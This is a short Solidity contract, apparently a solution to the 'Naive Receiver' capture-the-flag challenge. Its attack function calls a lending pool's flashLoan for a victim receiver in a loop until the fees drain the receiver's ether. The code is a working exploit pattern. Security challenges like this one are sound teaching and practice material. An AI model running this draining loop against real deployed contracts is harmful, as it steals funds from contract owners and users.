// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaiveReceiverLenderPool {
    function flashLoan(address, uint256) external;
}

//interface IFlashLoanReceiver {}

contract NaiveReceiverAttacker {
    function attack(address _poolAddress, address _receiverAddress) public {
        while (address(_receiverAddress).balance >= 1 ether) {
            // amount doesn't matter
            INaiveReceiverLenderPool(_poolAddress).flashLoan(
                _receiverAddress,
                1 ether
            );
        }
    }
}
